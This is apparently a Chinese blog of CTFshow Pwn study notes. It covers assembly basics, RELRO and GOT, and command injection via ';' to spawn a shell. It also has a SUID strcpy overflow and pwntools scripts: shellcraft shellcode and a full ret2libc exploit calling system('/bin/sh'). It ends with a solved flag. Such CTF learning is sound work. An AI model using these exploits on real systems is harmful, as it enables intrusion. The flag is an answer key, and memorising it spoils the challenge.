---
title: 学习笔记 02 | CTFshow_Pwn知识精炼(长期更新)
date: 2026-04-12 19:15:00
tags:
  - Pwn
  - CTF
  - 学习笔记
categories: 笔记
abbrlink: pwn-refined-01
description: 本博文为CTFshow中Pwn系列的做题笔记和知识总结,用于记录本人摸索二进制世界的历程
---

# 前言 

本博文为CTFshow中Pwn系列的做题笔记和知识总结,用于记录本人摸索 *二进制世界* 的历程;
没啥好说的 , **干就完了**  



# 前置基础

## Pwn5-12——计组基础：

题目附件给出的信息十分重要

```asm
section .data
    msg db "Welcome_to_CTFshow_PWN", 0
section .text
    global _start
_start:
; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1
; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx
; 直接寻址方式
    mov ecx, msg      ; 将msg的地址赋值给ecx
; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax
; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax
; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax
; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax

; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用
; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0
    int 0x80            ; 调用系统调用
```

总结：
![chart_1](/images/blog4(ctfshow_pwn)/image1.png)


### 1. 寄存器（CPU 的贴身口袋）

- **EAX (累加器)**：头号办事员。装返回值、做加减乘除、装系统调用号。
    
- **EBX, ECX, EDX**：办事材料袋。系统调用时，专门用来递交第 1、2、3 个参数。
    
- **ESI, EDI (变址)**：人形指针。专门指向内存地址，负责数据的搬运。
    

### 2. 寻址方式（找东西的套路）

唯一核心看懂 `[]`（中括号等于“开门取物”）：

- **无 `[]`**（如 `*mov ecx, msg*`）：把 门牌号（内存地址） 揣进口袋。
    
- **有 `[]`**（如 `*mov eax, [ecx]*`）：按着门牌号去找，开门把里面的东西 拿出来。
    
- **复合寻址**（如 [`ecx + edx*2 - 6]`）：小区大门(ecx) + 楼层(edx*2) + 微调退几步(-6) = 最终开门取物。
    

### 3. 系统调用（int 0x80 办事大厅）

这是 32 位 Linux 呼叫内核干活的固定套路：

- **EAX 装指令**：想打印填 4，想退出填 1。
    
- **其他口袋装材料**：比如把屏幕代号、字符串地址、长度分别塞进 EBX、ECX、EDX。
    
- **按呼叫铃**：执行 `int 0x80`，系统瞬间接管帮你办妥。
    

> **补充**：小端序中高字节存高地址，低字节存低地址。若想让程序读入 `0xdeadbeef` 去覆盖返回地址，用 Python 构造 Payload 时必须倒着敲：`\xef\xbe\xad\xde`。

## Pwn13-16 ——gcc编译的初步运用

对于 `.c` 结尾的 C 语言文件，或者 `.s` 结尾的汇编文件，GCC 原生支持。只要敲一行命令 `gcc 源码 -o 程序名` 就能成功编译。

但是对于 `.asm` 结尾的汇编文件，要先用 `nasm` 把代码翻译成半成品的 `.o` 文件，再用 `ld` 工具把半成品拼装成真正的程序（例如先 `nasm -f elf flag.asm -o flag.o`，再 `ld -m elf_i386 -o flag flag.o`）。

**补充：**

- **nasm: 常用汇编器(NASM)命令**
    
    - `-f elf`: 指定输出格式为 ELF，这是 Linux 常用的目标文件格式。
        
    - `flag.asm`: 输入的汇编源代码文件。
        
    - `-o flag.o`: 指定输出的目标文件名。
        
- **ld: GNU 链接器命令**
    
    - `-m elf_i386`: 指定生成 32 位架构的 ELF 格式可执行文件。
        
    - `-o flag`: 指定输出的可执行文件名。
        
    - `flag.o`: 输入的目标文件。
        

**其他常见输出格式：**

- `-f bin`: 生成纯二进制文件。
    
- `-f win32`: 生成 Windows 平台目标文件。
    
- `-f macho`: 生成 Mac OS X 目标文件。
    

> **踩坑点**：如果源码中存在文件读取操作（如 `fopen("key", "rb")`），必须在同级目录提前构造好文件。应该写 `echo -n "CTFshow" > key`，不写 `-n` 会额外引入换行符，破坏底层数据纯净度。

## Pwn17——命令拼接注入

**思路**：IDA 查看附件，发现出题人在 `dest` 里面放了 `"ls /"`。或许让用户输入一个目录名（比如 `tmp`），拼成 `"ls /tmp"`，然后用 `system()` 看目录里有什么。但使用了 `strcat` 来暴力拼接字符，我们只需使用分号 `;` 隔断，再输入 `sh` 便可提取 shell。

**补充：常用注入连接符 (Linux)**

- `;`：按顺序执行多条命令。
    
- `&&`：前面命令执行成功，才执行后面命令。
    
- `||`：前面命令执行失败，才执行后面命令。
    
- `|`（管道）：将前面命令的输出作为后面命令的输入。
    

_(踩坑点：本题通过注入弹出的 shell 是盲终端，没有 `ctfshow@ubuntu:~$` 提示符。可以通过 `ls` 或 `whoami` 测试。此处无法通过键盘移动光标，回车键也无法正常发挥功能，键入时应确保无误)_

## pwn18 —— `>>` 和 `>` 的辨析

|   |   |
|---|---|
|**符号**|**作用**|
|`命令 > 文件`|将标准输出重定向到文件中（清除原有文件中的数据）|
|`命令 >> 文件`|将标准输出重定向到文件中（在原有的内容后追加）|

## Pwn19 ——文件描述符与重定向

当程序的标准输出（1 号文件描述符 stdout）被 `fclose()` 恶意关闭时，正常的 `cat` 无法回显。必须利用依然敞开的报错通道（2 号文件描述符 stderr），构造命令 `cat /flag 1>&2`，将输出数据强行拐弯塞进报错通道打印在屏幕上。

**补充：文件描述符（0 & 1 & 2）**

- Linux 进程默认有 3 个缺省打开的文件描述符：标准输入 0 (stdin)，标准输出 1 (stdout)，标准错误 2 (stderr)。
    
- 0, 1, 2 对应的物理设备一般是：键盘、显示器、显示器。
    

## Pwn20-22 ——RELRO保护机制与GOT表

程序调用外部函数（如 `puts`、`system`）时，查阅底层的“内部通讯录”——即 `.got` 和 `.got.plt` 表（全局偏移表）。如果这两个表是可写的，我们就可以劫持 GOT 表。RELRO 保护机制就是为了把这个表锁定为只读。

底层读取出的地址（如 `0000000000600f18`）带有大量补位的 0。实战中约定俗成做法是去掉前导零，并加上十六进制前缀 `0x`（即 `0x600f18`）。

|   |   |   |
|---|---|---|
|**RELRO 状态**|**.got 运行权限**|**.got.plt 运行权限**|
|No RELRO|1 (可写)|1 (可写)|
|Partial RELRO|0 (只读)|1 (可写)|
|Full RELRO|0 (只读)|0 (只读/不存在)|

**踩坑点：**

- **readelf 命令的大小写**：
    
    - `readelf -s`（小写）：查看符号表 (Symbols)。只能看到函数名和变量名。
        
    - `readelf -S`（大写）：查看节头表 (Section Headers)。这才能找到内存块地址 (Addr) 和权限旗标 (Flg)。
        
- **静态标志与运行环境优先级**：
    
    - `readelf` (静态)：即使看到 `.got` 带有 WA 旗标，那也只是文件在硬盘上的静态属性。
        
    - `checksec` (动态)：只要确认了 Full RELRO，运行时权限将覆盖静态权限。
        

## Pwn23——命令行参数注入与SUID权限

**思路**：程序一开始用 `fgets` 把 Flag 偷偷读进内存，然后留了一个会调用 `sigsegv_handler` 的 `signal(11)`。程序吃启动参数 (`argv[1]`)，并把它扔给了不检查长度的 `strcpy`。利用命令替换 `$()` 挂载超长字符串，把 `strcpy` “撑爆”，引发段错误触发 `signal(11)`，借助 `pwnme` 程序带有的 SUID 权限得到 flag。

- **SUID 权限（提权跳板）**：当程序权限显示为 `-rwsr-sr-x`（带有 `s` 标志）且所有者为 root 时，进程会临时获得 root 权限。
    
- **Signal 11（段错误与“复活甲”）**：栈溢出覆盖返回地址后，抛出 SIGSEGV。若源码中有 `signal(11, handler)`，程序临死前会被拉去执行 handler 逻辑。
    

|   |   |   |
|---|---|---|
|**维度**|**标准输入 (stdin)**|**命令行参数 (argv)**|
|**C 语言源码特征**|使用 `scanf()`, `gets()`, `read()`, `fgets(..., stdin)`|在 main 函数中通过 `int main(int argc, char **argv)` 接收。核心是处理 `argv[1]`。|
|**正常人怎么用**|终端输入 `./pwnme` -> 提示录入 -> 敲字 -> 回车。|终端输入 `./pwnme AAAA` 直接回车。|
|**黑客注入手法**|管道符 `|`或 输入重定向`<`|
|**攻击模板**|`python3 -c "print('A'*200)"|./pwnme`|
|**Linux 底层跑法**|终端同时跑两个进程，建立管道。|终端先跑 Python 拿到结果，再拼成完整命令执行。|
|**错误下场**|喂错给 argv 程序：管道撑爆，报错 `BrokenPipeError`。|喂错给 stdin 程序：Payload 被当成杂项忽略，程序傻等键盘。|
|**进阶补充**|菜单题必须上 `pwntools` 库交互。|如果包含空格或特殊字符，会被切断。实战通常不考虑，因为打的是机器码。|

## Pwn24 —— pwntools 初步利用（shellcraft）

**思路**：没开 NX，静态分析发现读取后直接执行 `call eax`，而 `eax` 指向 `buf` 首地址。利用 `shellcraft` 自动编写 shellcode。

```python
from pwn import *
context(arch='i386', os='linux') 
# 32位 CPU 听不懂 64位机器码。告诉兵工厂：“我要打的是 32位 (i386) 的 Linux 靶机”。

p = remote('pwn.challenge.ctf.show', 28291)

shellcode = asm(shellcraft.sh())
# 1. shellcraft.sh()：自动写出调出 /bin/sh 的汇编。
# 2. asm(...)：翻译成十六进制机器码 (Shellcode)。

p.sendline(shellcode)
p.interactive()
```

## PWN25——Ret2libc初步利用

**思路**：开了 NX 保护，利用程序自带函数库攻击。泄露函数真实地址，利用 `LibcSearcher` 搜索 `system` 和 `/bin/sh` 地址。

#### 获取偏移值

1. `gdb ./pwn`
    
2. `cyclic 200 > pattern`
    
3. `run < pattern`
    
4. 段错误时执行 `info register eip` 得到 `0x6261616b`
    
5. `cyclic -l 0x6261616b` 得到偏移量
    

#### 泄露地址脚本

```python
from pwn import *
context(arch='i386', os='linux', log_level='debug')
p = remote('pwn.challenge.ctf.show', 28303)
elf = ELF('./1')

puts_plt = elf.plt['puts']
read_got = elf.got['read']
main_addr = elf.sym['main']
offset = 140

# Payload: 垃圾 + 函数 + 返回地址 + 参数
payload1 =  b'A' * offset + p32(puts_plt) + p32(main_addr) + p32(read_got)
p.sendline(payload1)

# 32位 Linux 地址常以 f7 开头，精准切片并解包
read_real_addr = u32(p.recvuntil(b'\xf7')[-4:].ljust(4, b'\x00'))
print(f"[*] Leak read addr: {hex(read_real_addr)}")
p.interactive()
```

#### 完整攻击 EXP

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
p = remote("pwn.challenge.ctf.show", 28303) 
elf = ELF('./pwn') 

main_addr = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
offset = 140 

# 阶段一：泄露坐标
payload1 = b'A' * offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload1)
leak_write = u32(p.recv(4))

# 阶段二：计算基址
libc_obj = LibcSearcher('write', leak_write)
libc_base = leak_write - libc_obj.dump('write')
system_addr = libc_base + libc_obj.dump('system')
bin_sh_addr = libc_base + libc_obj.dump('str_bin_sh')

# 阶段三：绝杀
payload2 = b'A' * offset + p32(system_addr) + p32(0) + p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
```

![Glibc](/images/blog4(ctfshow_pwn)/image2.png)
通过 `strings ./pwn | grep Ubuntu` 确定 `GCC: (Ubuntu 7.5.0-3ubuntu1~18.04)`。

- 18.04 对应 GLIBC 2.27。
    
- 审视选项：排除 0-3 (2.19), 4 (非 Ubuntu), 6, 9 (2.17)。
    
- **输入 5** 提取 flag。
    

**Flag**: `ctfshow{b513b07d-d063-400c-8429-64451fa11b8b}`